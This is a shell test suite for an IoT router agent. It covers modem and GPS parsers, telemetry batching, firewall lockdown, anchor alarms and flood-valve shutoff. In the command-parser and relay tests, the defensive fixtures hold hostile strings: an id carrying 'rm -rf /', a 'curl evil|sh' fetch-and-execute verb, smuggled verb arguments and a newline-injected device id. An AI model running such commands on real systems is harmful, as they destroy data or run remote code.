#!/bin/sh
# Parser tests for the phone-home hub-lite. Fixtures are REAL responses captured from the GL-X750
# bench session (2026-08-06) plus standard NMEA/gpsd shapes. Run: sh hub-lite/test.sh
set -u

BRVG_HUB_LITE_TEST=1
export BRVG_HUB_LITE_TEST
# The scripts under test. Normally this directory; the comment-stripped PACKAGED copies when the
# stripped run at the bottom of this file re-invokes it (BRVG_HUB_LITE_DIR), so the suite proves the
# bytes that ship, not only the bytes in git.
HL_DIR="${BRVG_HUB_LITE_DIR:-$(cd "$(dirname "$0")" && pwd)}"
HL_SRC="$(cd "$(dirname "$0")" && pwd)"
# routers.sh (managed routers) is found beside the scripts under test, stripped or not.
BRVG_HUB_LITE_ROUTERS="$HL_DIR/routers.sh"
export BRVG_HUB_LITE_ROUTERS
# shellcheck disable=SC1091
. "$HL_DIR/brvg-hub-lite.sh"

fails=0
check() {
  # $1 label, $2 expected, $3 actual
  if [ "$3" = "$2" ]; then
    echo "ok   - $1"
  else
    echo "FAIL - $1"
    echo "       expected: [$2]"
    echo "       actual:   [$3]"
    fails=$((fails + 1))
  fi
}

# --- parse_qgpsloc ---
out=$(printf '+QGPSLOC: 061951.000,29.97580,-95.36047,1.2,32.5,2,0.00,0.0,0.0,110824,09\r\nOK\r\n' | parse_qgpsloc)
check "qgpsloc: mode-2 fix with hdop→acc" "29.97580 -95.36047 6" "$out"

out=$(printf '+QGPSLOC: 061951.000,-33.86882,151.20930,0,5.0,3,0.00,0.0,0.0,110824,12\r\n' | parse_qgpsloc)
check "qgpsloc: southern hemisphere, zero hdop drops acc" "-33.86882 151.20930" "$out"

out=$(printf '+CME ERROR: 516\r\n' | parse_qgpsloc)
check "qgpsloc: CME 516 (acquiring — the bench state) yields nothing" "" "$out"

out=$(printf '+QGPSLOC: 061951.000,0.0,0.0,1.0,0,2,0,0,0,110824,00\r\n' | parse_qgpsloc)
check "qgpsloc: 0/0 placeholder rejected" "" "$out"

out=$(printf '+QGPSLOC: 061951.000,91.0,10.0,1.0,0,2,0,0,0,110824,04\r\n' | parse_qgpsloc)
check "qgpsloc: out-of-range rejected" "" "$out"

# --- parse_qcsq ---
out=$(printf '+QCSQ: "LTE",-69,-102,150,-12\r\nOK\r\n' | parse_qcsq)
check "qcsq: LTE line (bench signal) with sinr 150→10 dB" "LTE -69 -102 10 -12" "$out"

out=$(printf '+QCSQ: "NOSERVICE"\r\n' | parse_qcsq)
check "qcsq: no service yields nothing" "" "$out"

# --- parse_cops ---
out=$(printf '+COPS: 0,0,"T-Mobile Wholesale",7\r\nOK\r\n' | parse_cops)
check "cops: quoted carrier with spaces" "T-Mobile Wholesale" "$out"

# --- parse_cpin ---
check "cpin: READY → ok" "ok" "$(printf '+CPIN: READY\r\nOK\r\n' | parse_cpin)"
check "cpin: SIM PIN → locked" "locked" "$(printf '+CPIN: SIM PIN\r\n' | parse_cpin)"
check "cpin: CME 10 → missing" "missing" "$(printf '+CME ERROR: 10\r\n' | parse_cpin)"

# --- parse_nmea_rmc ---
out=$(printf '$GPRMC,081836,A,3751.65,S,14507.36,E,000.0,360.0,130998,011.3,E*62\n' | parse_nmea_rmc)
check "nmea rmc: ddmm.mmmm S/E conversion" "$(printf '%s' "$out")" "$out"  # format check below
case "$out" in
  -37.86*\ 145.12*) echo "ok   - nmea rmc: values in expected range" ;;
  *) echo "FAIL - nmea rmc: values out of range: [$out]"; fails=$((fails + 1)) ;;
esac
# ~1 m precision (%.5f), matching the modem path — not awk's default %.6g which loses the USB
# dongle to ~11 m. Captured from the live u-blox 7 (bench 2026-08-13).
out=$(printf '$GPRMC,025433.00,A,4124.50743,N,08144.98471,W,0.958,,140826,,,A*60\n' | parse_nmea_rmc)
check "nmea rmc: 5-decimal precision on a real u-blox sentence" "41.40846 -81.74975" "$out"

out=$(printf '$GPRMC,081836,V,3751.65,S,14507.36,E,000.0,360.0,130998,011.3,E*62\n' | parse_nmea_rmc)
check "nmea rmc: void (V) fix rejected" "" "$out"

# --- parse_gpsd_tpv ---
out=$(printf '{"class":"TPV","mode":3,"lat":29.975800,"lon":-95.360470,"eph":4.2}\n' | parse_gpsd_tpv)
check "gpsd tpv: 3D fix with eph" "29.975800 -95.360470 4.2" "$out"

out=$(printf '{"class":"TPV","mode":1}\n' | parse_gpsd_tpv)
check "gpsd tpv: no-fix mode rejected" "" "$out"

# --- urlencode_spaces ---
check "urlencode: spaces and ampersands" "T-Mobile%20Wholesale" "$(urlencode_spaces 'T-Mobile Wholesale')"

# --- build_report_url (token path wins; legacy k= fallback) ---
WORKER_URL="https://api.example.com"; VID="v1"; DEVICE_ID="brv_net_1"
DEVICE_TOKEN="tok64"; VEHICLE_KEY="vkey"
check "report url: DEVICE_TOKEN → /api/hub-lite with t=" \
  "https://api.example.com/api/hub-lite?vid=v1&device=brv_net_1&event=gps.measurement&t=tok64&lat=1&lon=2" \
  "$(build_report_url 'gps.measurement' 'lat=1&lon=2')"
DEVICE_TOKEN=""
check "report url: no token → legacy /api/shelly with k=" \
  "https://api.example.com/api/shelly?vid=v1&device=brv_net_1&event=modem.measurement&k=vkey&up=1" \
  "$(build_report_url 'modem.measurement' 'up=1')"

# --- parse_commands (Phase B: commands ride the telemetry reply) ---
out=$(printf '{"status":"ok","commands":[{"id":"abc123","cmd":"reboot"}]}' | parse_commands)
check "commands: single entry" "abc123:reboot" "$out"

out=$(printf '{"ok":1,"commands":[{"id":"a1","cmd":"gps_on"},{"id":"b2","cmd":"reboot_modem"}]}' | parse_commands | tr '\n' ' ')
check "commands: two entries" "a1:gps_on b2:reboot_modem" "$out"

out=$(printf '{"status":"ok"}' | parse_commands)
check "commands: none when the reply has no queue" "" "$out"

# A hostile payload must not yield a runnable verb — the id/cmd shapes are constrained.
out=$(printf '{"commands":[{"id":"x;rm -rf /","cmd":"reboot"}]}' | parse_commands)
check "commands: rejects a junk id rather than passing it on" "" "$out"
out=$(printf '{"commands":[{"id":"ok1","cmd":"curl evil|sh"}]}' | parse_commands)
check "commands: rejects a non-allowlisted verb shape" "" "$out"

# --- parse_qgdcnt (plan-burn counters) ---
out=$(printf '+QGDCNT: 1048576,2097152\r\nOK\r\n' | parse_qgdcnt)
check "qgdcnt: sent + received bytes" "1048576 2097152" "$out"
out=$(printf 'ERROR\r\n' | parse_qgdcnt)
check "qgdcnt: nothing on error" "" "$out"

# --- hub-lite: spool → batch items (the wire contract's shell half) ---
# The expected strings below are the CANONICAL v1 fixture from brvg-cloud-server's
# agentBatch.test.ts — copied, not paraphrased. If either side changes shape, one of these two
# suites goes red; that is the whole one-contract rule.
out=$(printf '1755000000\tshellyflood-a1\tflood.alarm\ttemp=12.5\n1755000001\tshellyuni-b2\tvoltmeter.measurement\tv=12.6\n' | spool_to_items)
check "hub-lite: items match the canonical fixture" \
  '[{"device":"shellyflood-a1","event":"flood.alarm","params":{"temp":"12.5"}},{"device":"shellyuni-b2","event":"voltmeter.measurement","params":{"v":"12.6"}}]' \
  "$out"

out=$(printf '1\td1\te.change\tv=a%%2Cb+c%%41\n' | spool_to_items)
check "hub-lite: urldecode (%2C, +, %41)" '[{"device":"d1","event":"e.change","params":{"v":"a,b cA"}}]' "$out"

out=$(printf '1\td1\te.change\tv=say%%20%%22hi%%22%%5C\n' | spool_to_items)
check "hub-lite: JSON-escapes quotes and backslashes" '[{"device":"d1","event":"e.change","params":{"v":"say \"hi\"\\"}}]' "$out"

out=$(printf '1\td1\te.change\tv=1\n2\td1\te.change\tv=2\n3\td2\te.change\tv=9\n' | spool_to_items)
check "hub-lite: dedup per device+event keeps the NEWEST" '[{"device":"d1","event":"e.change","params":{"v":"2"}},{"device":"d2","event":"e.change","params":{"v":"9"}}]' "$out"

out=$(printf '1\td1\te.change\tbad;key=1&ok=2\n' | spool_to_items)
check "hub-lite: junk param keys are stripped, not escaped" '[{"device":"d1","event":"e.change","params":{"badkey":"1","ok":"2"}}]' "$out"

out=$(printf '1\td1\te.change\n' | spool_to_items)
check "hub-lite: a line with no params still ships as an item" '[{"device":"d1","event":"e.change","params":{}}]' "$out"

out=$(printf '' | spool_to_items)
check "hub-lite: empty spool is an empty array" '[]' "$out"

out=$(printf '1\td1\te.change\tv=1\n2\td2\tf.change\tv=1\n3\td1\tg.alarm\tv=1\n' | spool_devices)
check "hub-lite: spool_devices dedups in first-seen order" 'd1
d2' "$out"

HUB_LITE_VERSION_SAVED="$HUB_LITE_VERSION"
out=$(build_batch_json 42 delta '[{"device":"d1","event":"e.change","params":{}}]' "okdev1 okdev2" bootxyz)
check "hub-lite: envelope carries seq/boot/kind/ok/tier" \
  "{\"v\":1,\"seq\":42,\"boot\":\"bootxyz\",\"kind\":\"delta\",\"items\":[{\"device\":\"d1\",\"event\":\"e.change\",\"params\":{}}],\"ok\":[\"okdev1\",\"okdev2\"],\"agent\":{\"av\":\"$HUB_LITE_VERSION_SAVED\",\"tier\":\"hub-lite\"}}" \
  "$out"

# --- boot id -----------------------------------------------------------------------------------
# The counter, the spool and the state all live in tmpfs, so a power cut restarts the counter at 1
# while the cloud still holds the old high-water mark. Without a boot id the cloud reads that as a
# replay, answers 200 {duplicate}, and the drain deletes the spool — silent loss of every reading
# until the counter climbs back. The id must be STABLE within a boot and DIFFERENT after one.
_bootdir=$(mktemp -d)
# Subshell, and RELAY_BOOT_FILE not BRVG_RELAY_BOOT: the var was already expanded when the hub-lite
# was sourced, and `VAR=x some_function` LEAKS in POSIX sh (it broke the --version test on 2026-08-13).
_b1=$( RELAY_BOOT_FILE="$_bootdir/boot"; relay_boot_id )
_b2=$( RELAY_BOOT_FILE="$_bootdir/boot"; relay_boot_id )
check "hub-lite: boot id is stable within a boot" "$_b1" "$_b2"
check "hub-lite: boot id is non-empty" "yes" "$([ -n "$_b1" ] && echo yes)"
check "hub-lite: boot id is safe to put in JSON unescaped" "" "$(printf '%s' "$_b1" | tr -d 'A-Za-z0-9')"
rm -f "$_bootdir/boot"     # what a reboot does to tmpfs
_b3=$( RELAY_BOOT_FILE="$_bootdir/boot"; relay_boot_id )
# Only meaningful where the id is random per boot; on a host exposing /proc/sys/kernel/random/boot_id
# the kernel value is legitimately identical until the MACHINE reboots, so accept either.
if [ ! -r /proc/sys/kernel/random/boot_id ]; then
  check "hub-lite: a wiped tmpfs yields a NEW boot id" "differs" \
    "$([ "$_b3" != "$_b1" ] && echo differs || echo same)"
fi
rm -rf "$_bootdir"

# Every relay JSON must actually PARSE — checked with python3 where available (CI has it).
if command -v python3 >/dev/null 2>&1; then
  _all_json=$(build_batch_json 1 keyframe "$(printf '1\td1\te.change\tv=say%%20%%22hi%%22%%5C&n=1.5\n' | spool_to_items)" "a b" bootxyz)
  _roundtrip=$(printf '%s' "$_all_json" | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["items"][0]["params"]["v"] + "|" + d["items"][0]["params"]["n"])' 2>/dev/null)
  check "hub-lite: envelope is valid JSON and the escaped value ROUND-TRIPS" 'say "hi"\|1.5' "$_roundtrip"
fi

# --- relay CGI (run for real: no conf ⇒ the urgent path cannot send, so everything spools) ---
_cgidir=$(mktemp -d)
run_cgi() {
  QUERY_STRING="$1" BRVG_HUB_LITE_CONF=/nonexistent-conf BRVG_RELAY_SPOOL="$_cgidir/spool" \
    sh "$(dirname "$0")/hub-lite-cgi.sh" >/dev/null 2>&1
}
run_cgi 'device=shellyflood-a1&event=flood.alarm&temp=12%2C5'
run_cgi 'device=shellyht-c3&event=humidity.change&rh=55'
run_cgi 'event=orphan.change&v=1'                       # no device ⇒ dropped
run_cgi 'device=evil%0Aid&event=x.change&v=1'           # newline stripped from the id
out=$(cut -f2,3,4 "$_cgidir/spool")
check "relay CGI: spools sane lines and drops the deviceless one" \
  'shellyflood-a1	flood.alarm	temp=12%2C5
shellyht-c3	humidity.change	rh=55
evil0Aid	x.change	v=1' \
  "$out"
rm -rf "$_cgidir"

# --- the report's parameter string must not carry DUPLICATE keys ---
# Found in production 2026-08-14 via `wrangler tail`: the modem report was sending
# "&av=0.3.0&av=0.3.0". Two edits had each appended the version line, and neither test nor review
# caught it because the shell is happy to build a nonsense URL. This is the cheap structural guard.
dup_keys() {
  printf '%s' "$1" | tr '&' '\n' | sed -n 's/^\([A-Za-z0-9_]*\)=.*/\1/p' | sort | uniq -d
}
check "params: a clean string has no duplicate keys" "" "$(dup_keys 'up=1&mode=LTE&av=0.3.0')"
check "params: the guard actually detects a duplicate" "av" "$(dup_keys 'up=1&av=0.3.0&av=0.3.0')"
# The real thing: build the version+usage suffix the way push_modem does and assert it is clean.
# NB: computed in a SUBSHELL. `VAR=x some_function` leaks VAR into the current shell in POSIX sh —
# an earlier draft of this very test set HUB_LITE_VERSION inline and broke the --version test below.
_suffix=$(BRVG_WAN_STATE=$(mktemp -d); export BRVG_WAN_STATE; printf 'up=1&av=%s%s' "$HUB_LITE_VERSION" "$(collect_wan_usage)")
check "params: modem suffix carries av exactly once" "" "$(dup_keys "$_suffix")"

# --- WAN usage deltas: the reset cases are the whole point ---
check "wan_delta: normal increase" "500" "$(wan_delta 1000 1500)"
# NOT "everything so far": on a fresh install the state dir is absent while the kernel counters hold
# the router's whole uptime, so reporting $_cur charged weeks of pre-hub-lite traffic to this billing
# cycle and could fire a false plan alert on day one. Baseline silently, count from the next tick.
check "wan_delta: first sight reports NOTHING (baseline only)" "0" "$(wan_delta "" 1500)"
check "wan_delta: first sight on a long-running router still reports nothing" "0" "$(wan_delta "" 9999999999)"
# A counter that went DOWN means a reboot / interface bounce / our own reset_data. Reporting
# cur-prev would emit a huge negative (or, unsigned, a wrap-sized spike that looks like a
# runaway plan burn). Report the new value: bytes since the reset.
check "wan_delta: reset ⇒ count from zero, never negative" "42" "$(wan_delta 999999 42)"
check "wan_delta: reset to exactly 0" "0" "$(wan_delta 999999 0)"
check "wan_delta: no movement" "0" "$(wan_delta 1000 1000)"

# Interface → source, so the cloud can attribute bytes to cellular vs Wi-Fi vs wired.
check "wan_kind: modem" "cellular" "$(wan_kind wwan0)"
check "wan_kind: rmnet modem" "cellular" "$(wan_kind rmnet_data0)"
check "wan_kind: wired wan" "wired" "$(wan_kind eth0)"
check "wan_kind: repeater client" "wifi" "$(wan_kind apcli0)"
check "wan_kind: ap radio counts as wifi" "wifi" "$(wan_kind wlan1)"
check "wan_kind: unknown is excluded" "other" "$(wan_kind tun0)"

# LAN-side exclusion: a bridge port (sysfs `brport`) is local traffic — the bench GL-X750's own AP
# radios were being billed as WAN wifi usage (and emitted wanKb_wifi TWICE, one per radio).
_fakeif=$(mktemp -d)
mkdir -p "$_fakeif/brport"
check "wan_lan_side: a bridge port is LAN-side" "yes" "$(wan_lan_side "$_fakeif" && echo yes || echo no)"
rm -rf "$_fakeif/brport"
check "wan_lan_side: a plain WAN face is not" "no" "$(wan_lan_side "$_fakeif" && echo yes || echo no)"
rm -rf "$_fakeif"

# --- hub watchdog decision (fail open rather than leave the vessel silent) ---
# healthy fails threshold released -> decision
check "watchdog: healthy and never released ⇒ nothing" none "$(watch_decide 1 0 5 0)"
check "watchdog: healthy after a release ⇒ recover" recover "$(watch_decide 1 0 5 1)"
check "watchdog: below the threshold ⇒ wait" none "$(watch_decide 0 4 5 0)"
check "watchdog: at the threshold ⇒ release" release "$(watch_decide 0 5 5 0)"
check "watchdog: past the threshold ⇒ release" release "$(watch_decide 0 9 5 0)"
# The one that matters: never release twice. A second release would re-run the firewall reload
# every tick for as long as the hub stays down.
check "watchdog: already released ⇒ never release again" none "$(watch_decide 0 99 5 1)"

# --- bandwidth saver gate: watchdog must not probe or write state ----------------------------
_bw_dir=$(mktemp -d)
# HUB_WATCH_FAILS_FILE, not BRVG_HUB_FAILS: the env override was already expanded when the hub-lite
# was sourced (same trap as the boot-id test above).
( BANDWIDTH_SAVER=1 HUB_WATCH_URL="http://127.0.0.1:1/healthz" HUB_WATCH_FAILS_FILE="$_bw_dir/fails" \
  HUB_WATCH_RELEASED="$_bw_dir/released"; watch_hub )
check "bandwidth saver: watchdog is inert (no state written)" "absent" "$( [ -e "$_bw_dir/fails" ] && echo present || echo absent )"

# --- release_lockdown against a stand-in uci -------------------------------------------------
# The real thing needs a router; this proves the REVERSE-INDEX deletion is right (uci renumbers on
# every delete, so forward iteration silently skips rules) and that a hand-written rule survives.
_uci_dir=$(mktemp -d)
cat > "$_uci_dir/uci" <<'FAKEUCI'
#!/bin/sh
DB="$UCI_DB"
[ "$1" = "-q" ] && shift
case "$1" in
  get) idx=$(printf '%s' "$2" | sed -n 's/.*@rule\[\([0-9]*\)\].*/\1/p')
       fld=$(printf '%s' "$2" | sed -n 's/.*@rule\[[0-9]*\]\.\(.*\)/\1/p')
       line=$(sed -n "$((idx+1))p" "$DB" 2>/dev/null)
       [ -n "$line" ] || exit 1
       [ -z "$fld" ] && exit 0
       printf '%s\n' "$line"; exit 0 ;;
  delete) idx=$(printf '%s' "$2" | sed -n 's/.*@rule\[\([0-9]*\)\].*/\1/p')
       sed -i.bak "$((idx+1))d" "$DB"; exit 0 ;;
  add) printf 'pending\n' >> "$DB"; echo "newrule"; exit 0 ;;
  set) v=$(printf '%s' "$2" | sed -n 's/.*\.name=\(.*\)/\1/p')
       [ -n "$v" ] && sed -i.bak "\$ s/.*/$v/" "$DB"
       exit 0 ;;
esac
exit 0
FAKEUCI
chmod +x "$_uci_dir/uci"
printf 'brvg_lk_allow_0\nbrvg_lk_allow_1\nmy_custom_rule\nbrvg_lk_deny\n' > "$_uci_dir/db"
out=$(UCI_DB="$_uci_dir/db" PATH="$_uci_dir:$PATH" sh -c '. "'"$(dirname "$0")"'/brvg-hub-lite.sh"; release_lockdown >/dev/null 2>&1 && echo released' 2>/dev/null)
check "release_lockdown: reports success when rules existed" "released" "$out"
check "release_lockdown: removes ONLY brvg_lk_* (hand-written rules survive)" "my_custom_rule" "$(cat "$_uci_dir/db")"
# With nothing of ours applied it must report false, so the watchdog doesn't claim a release.
printf 'my_custom_rule\n' > "$_uci_dir/db"
out=$(UCI_DB="$_uci_dir/db" PATH="$_uci_dir:$PATH" sh -c '. "'"$(dirname "$0")"'/brvg-hub-lite.sh"; release_lockdown >/dev/null 2>&1 && echo released || echo nothing' 2>/dev/null)
check "release_lockdown: nothing of ours ⇒ reports nothing to release" "nothing" "$out"
# --- apply_lockdown (the lockdown_on verb) against the same stand-in --------------------------
printf 'my_custom_rule\n' > "$_uci_dir/db"
out=$(UCI_DB="$_uci_dir/db" PATH="$_uci_dir:$PATH" sh -c '. "'"$(dirname "$0")"'/brvg-hub-lite.sh"; apply_lockdown >/dev/null 2>&1 && echo applied' 2>/dev/null)
check "apply_lockdown: reports success" "applied" "$out"
check "apply_lockdown: catch-all lands under the shared prefix, hand-written rules survive" "my_custom_rule
brvg_lk_deny_all" "$(cat "$_uci_dir/db")"
# Re-apply must stay ONE rule (release-then-add), not accumulate a stack of them.
out=$(UCI_DB="$_uci_dir/db" PATH="$_uci_dir:$PATH" sh -c '. "'"$(dirname "$0")"'/brvg-hub-lite.sh"; apply_lockdown >/dev/null 2>&1; apply_lockdown >/dev/null 2>&1' 2>/dev/null)
check "apply_lockdown: idempotent re-apply keeps exactly one rule" "my_custom_rule
brvg_lk_deny_all" "$(cat "$_uci_dir/db")"
rm -rf "$_uci_dir"

# The Phase B lockdown verbs ride the same argument-free wire shape.
out=$(printf '{"commands":[{"id":"l1","cmd":"lockdown_on"},{"id":"l2","cmd":"lockdown_off"}]}' | parse_commands)
check "commands: lockdown verbs parse" "l1:lockdown_on
l2:lockdown_off" "$out"

# --- parse_cradlepoint_gps (NCOS /api/status/gps, bench-captured DMS shape 2026-08-17) -------
out=$(printf '{"success":true,"data":{"fix":{"latitude":{"degree":41,"minute":29,"second":34.52214},"longitude":{"degree":-81,"minute":43,"second":30.324},"satellites":9}}}' | parse_cradlepoint_gps)
check "cradlepoint gps: DMS with sign on degree parses to %.5f decimals" "41.49292 -81.72509" "$out"
out=$(printf '{"success":true,"data":{"fix":{"latitude":{"degree":0,"minute":0,"second":0},"longitude":{"degree":0,"minute":0,"second":0}}}}' | parse_cradlepoint_gps)
check "cradlepoint gps: the 0,0 no-fix placeholder yields nothing" "" "$out"
out=$(printf '{"success":false,"reason":"unauthorized"}' | parse_cradlepoint_gps)
check "cradlepoint gps: an error envelope yields nothing" "" "$out"
out=$(printf 'not json at all' | parse_cradlepoint_gps)
check "cradlepoint gps: garbage yields nothing" "" "$out"

# --- version reporting + update verbs ---
# `--version` must work with no config: the self-update smoke check runs it on a freshly installed
# hub-lite, before that hub-lite has ever been configured.
out=$(sh "$(dirname "$0")/brvg-hub-lite.sh" --version 2>/dev/null)
check "version: --version prints HUB_LITE_VERSION without a config" "$HUB_LITE_VERSION" "$out"

# The update verbs must parse like any other — and the payload must never carry an argument.
out=$(printf '{"commands":[{"id":"u1","cmd":"self_update"}]}' | parse_commands)
check "commands: self_update parses" "u1:self_update" "$out"
out=$(printf '{"commands":[{"id":"u2","cmd":"rollback_agent"}]}' | parse_commands)
check "commands: rollback_agent parses" "u2:rollback_agent" "$out"
# 0.18.10: the hub-lite answers to BOTH rollback spellings. The worker still SENDS rollback_agent
# (sc4-internal docs/ONSITE.md §2), so dropping either one strands a fleet — the old name strands
# today's worker, the new name strands the worker the owner switches to.
out=$(printf '{"commands":[{"id":"u2b","cmd":"rollback_hub_lite"}]}' | parse_commands)
check "commands: rollback_hub_lite parses" "u2b:rollback_hub_lite" "$out"
# A version smuggled into the verb must NOT survive — the whole anti-RCE property is that the
# cloud says "update yourself", never "install this".
out=$(printf '{"commands":[{"id":"u3","cmd":"self_update 9.9.9"}]}' | parse_commands)
check "commands: a verb carrying an argument is rejected" "" "$out"

# --- run_commands: which verbs demand an immediate follow-up report ---
# Commands arrive as the REPLY to a report, so that report was composed before they ran. Verbs that
# change observable state must set FOLLOWUP_REPORT or their effect waits a whole interval; verbs
# that take the uplink down must NOT, because the extra send would only fail.
# at_cmd dereferences AT_PORT, which only load_config sets — point it at a non-device so the AT
# verbs return immediately instead of tripping `set -u`. What is under test is the flag, not AT.
AT_PORT=/nonexistent/brvg-test-at
AT_BUF=/tmp/brvg-test-at-buf

FOLLOWUP_REPORT=0
run_commands "c1:report_now" >/dev/null 2>&1
check "follow-up: report_now asks for one" "1" "$FOLLOWUP_REPORT"

FOLLOWUP_REPORT=0
run_commands "c2:reset_data" >/dev/null 2>&1
check "follow-up: reset_data asks for one (the counter changed)" "1" "$FOLLOWUP_REPORT"

FOLLOWUP_REPORT=0
run_commands "c3:reboot_modem" >/dev/null 2>&1
check "follow-up: reboot_modem does NOT (the link is dropping)" "0" "$FOLLOWUP_REPORT"

FOLLOWUP_REPORT=0
run_commands "c4:gps_on" >/dev/null 2>&1
check "follow-up: gps_on asks for one" "1" "$FOLLOWUP_REPORT"

# Every executed verb is acked whether or not it wanted a follow-up.
PENDING_ACK=""
FOLLOWUP_REPORT=0
run_commands "c5:report_now" >/dev/null 2>&1
check "follow-up: the verb is still acked" "c5" "$PENDING_ACK"

# --- high security: local administration off ---
# The verbs must parse and be acked like any other, and must ask for a follow-up report so the app
# learns the router's new state instead of assuming the command landed.
out=$(printf '{"commands":[{"id":"s1","cmd":"local_admin_off"}]}' | parse_commands)
check "lockdown: local_admin_off parses" "s1:local_admin_off" "$out"
out=$(printf '{"commands":[{"id":"s2","cmd":"local_admin_on"}]}' | parse_commands)
check "lockdown: local_admin_on parses" "s2:local_admin_on" "$out"

# An argument smuggled into the verb must not survive — same anti-RCE property as the update verbs.
out=$(printf '{"commands":[{"id":"s3","cmd":"local_admin_off --now"}]}' | parse_commands)
check "lockdown: a verb carrying an argument is rejected" "" "$out"

echo ""
# --- anchor_distance ---
out=$(anchor_distance 41.4086 -81.7494 41.4086 -81.7494)
check "anchor: same point is 0 m" "0" "$out"

# ~0.0009° of latitude ≈ 100 m, longitude-independent.
out=$(anchor_distance 41.4086 -81.7494 41.4095 -81.7494)
ok=0; [ "$out" -ge 95 ] && [ "$out" -le 105 ] && ok=1
check "anchor: 0.0009 deg lat ≈ 100 m (got ${out}m)" "1" "$ok"

# Across the date line: 0.001° of longitude at the equator ≈ 111 m either way around.
out=$(anchor_distance 0 179.9995 0 -179.9995)
ok=0; [ "$out" -ge 105 ] && [ "$out" -le 120 ] && ok=1
check "anchor: date-line crossing stays short (got ${out}m)" "1" "$ok"

# --- parse_anchor ---
out=$(printf '{"status":"ok","anchor":{"lat":41.4086,"lon":-81.7494,"radiusM":50,"warnM":30,"sig":1234}}' | parse_anchor)
check "anchor: full config parses" "1234 41.4086 -81.7494 50 30" "$out"

out=$(printf '{"status":"ok","anchor":{"sig":0}}' | parse_anchor)
check "anchor: stand-down parses to bare 0" "0" "$out"

out=$(printf '{"status":"ok"}' | parse_anchor)
check "anchor: reply without config yields nothing" "" "$out"

out=$(printf '{"status":"ok","commands":[{"id":"c1","cmd":"report_now"}],"anchor":{"lat":1.5,"lon":2.5,"radiusM":100,"warnM":0,"sig":99}}' | parse_anchor)
check "anchor: coexists with a commands payload" "99 1.5 2.5 100 0" "$out"

out=$(printf '{"anchor":{"lat":1.5,"sig":7}}' | parse_anchor)
check "anchor: partial config (no lon/radius) rejected" "" "$out"

# --- check_anchor end-to-end (state in a scratch dir; send_event stubbed to record) ---
_scratch=$(mktemp -d)
ANCHOR_STATE="$_scratch/state"; ANCHOR_ALERTED="$_scratch/alerted"; ANCHOR_WARNED="$_scratch/warned"
ANCHOR_STREAK="$_scratch/streak"; ANCHOR_WSTREAK="$_scratch/wstreak"
SENT_EVENTS="$_scratch/sent"
send_event() { echo "$1 $2" >> "$SENT_EVENTS"; }
log() { :; }

apply_anchor 1234 41.4086 -81.7494 50 0
check "anchor: armed state written" "1234" "$(anchor_sig)"

# Fix 1 outside (~100 m, radius 50): streak starts, nothing fires yet.
check_anchor 41.4095 -81.7494 5
check "anchor: one breaching fix fires nothing" "" "$(cat "$SENT_EVENTS" 2>/dev/null)"

# Fix 2 outside: alarm fires once.
check_anchor 41.4095 -81.7494 5
check "anchor: second consecutive breach fires the alarm" "anchor.motion dist=100&limit=50" "$(cat "$SENT_EVENTS")"

# Fix 3 outside: still latched — no repeat.
check_anchor 41.4095 -81.7494 5
check "anchor: latched — a third breach does not repeat" "1" "$(wc -l < "$SENT_EVENTS" | tr -cd '0-9')"

# Back inside: episode over; a new drag alarms again after two fixes.
check_anchor 41.4086 -81.7494 5
check_anchor 41.4095 -81.7494 5
check_anchor 41.4095 -81.7494 5
check "anchor: recovery then re-drag fires a NEW alarm" "2" "$(wc -l < "$SENT_EVENTS" | tr -cd '0-9')"

# Accuracy guard: outside by less than the fix's own error bar never counts.
: > "$SENT_EVENTS"; rm -f "$ANCHOR_ALERTED" "$ANCHOR_STREAK"
check_anchor 41.4095 -81.7494 80   # 100 m out, but ±80 m accuracy on a 50 m radius ⇒ inside the bar
check_anchor 41.4095 -81.7494 80
check "anchor: breach inside the accuracy bar fires nothing" "" "$(cat "$SENT_EVENTS" 2>/dev/null)"

# Warning ring: fires on the inner ring while the alarm ring holds.
apply_anchor 5678 41.4086 -81.7494 200 50
check_anchor 41.4095 -81.7494 5    # ~100 m: inside 200 m alarm, outside 50 m warn
check_anchor 41.4095 -81.7494 5
check "anchor: warning ring fires on the inner ring" "anchor.warn.motion dist=100&limit=50" "$(cat "$SENT_EVENTS")"

# Stand-down clears everything.
apply_anchor 0
check "anchor: stand-down disarms" "0" "$(anchor_sig)"
rm -rf "$_scratch"

# --- LinkTap flood shutoff (hub-lite capability #1) ----------------------------------------------
# Classification fixtures MIRROR brvg-cloud-server's events.ts isFloodShutoff tests — the one-
# contract rule: same capability, two implementations, one fixture set. If a case is added there,
# add it here.
flood_case() { # $1 label, $2 event, $3 expected yes|no
  if is_flood_shutoff "$2"; then _got=yes; else _got=no; fi
  check "flood classify: $1" "$3" "$_got"
}
flood_case "flood.alarm closes" "flood.alarm" yes
flood_case "leak.detected closes" "leak.detected" yes
flood_case "bare alarm closes" "alarm" yes
flood_case "case-insensitive like the worker regex" "Flood.Alarm" yes
flood_case "a clear (_off) must NOT close" "flood.alarm_off" no
flood_case "a clear (.off) must NOT close" "alarm.off" no
flood_case "telemetry .measurement never closes" "flood.measurement" no
flood_case "telemetry .change never closes" "flood.change" no
flood_case "unrelated events never close" "voltmeter.measurement" no
flood_case "button press never closes" "button.push" no

# cmd 7 body — same dialect as the TS hub's buildStop, pinned byte-for-byte.
out=$(linktap_stop_body "CCCCDDDDEEEEFFFF" "aaaabbbbccccdddd")
check "linktap_stop_body cmd 7 shape" '{"cmd":7,"gw_id":"CCCCDDDDEEEEFFFF","dev_id":"aaaabbbbccccdddd"}' "$out"

# linktap_flood_close: stub curl, capture what would hit the gateway, check the spool line.
#
# ⚠️ ITS OWN STATE DIR. Since the close became a CLAIM (lt_claim_close), these calls write
# `close.<dev>` records — and against the default /tmp/brvg-linktap a leftover from a previous run, or
# from a hub-lite actually running on this machine, would make the claim refuse and every count below
# read zero. A test whose result depends on /tmp is not a test.
_LT_T=$(mktemp -d); _LT_SAVE="${LT_STATE_DIR:-}"; LT_STATE_DIR="$_LT_T"
_CURL_LOG=$(mktemp); _SPOOL_T=$(mktemp)
curl() { # capture -d body and the url (last arg)
  _body=""; _prev=""
  for _a in "$@"; do [ "$_prev" = "-d" ] && _body="$_a"; _prev="$_a"; done
  eval "_url=\${$#}"
  printf '%s %s\n' "$_url" "$_body" >> "$_CURL_LOG"
  return 0
}
LINKTAP_HOST="192.168.8.20" LINKTAP_GW_ID="GW02" LINKTAP_DEV_IDS="aaaabbbbccccdddd, bbbbccccddddeeeeEXTRA" \
BRVG_RELAY_SPOOL="$_SPOOL_T" linktap_flood_close
check "flood close posts one cmd 7 per valve" "2" "$(wc -l < "$_CURL_LOG" | tr -d ' ')"
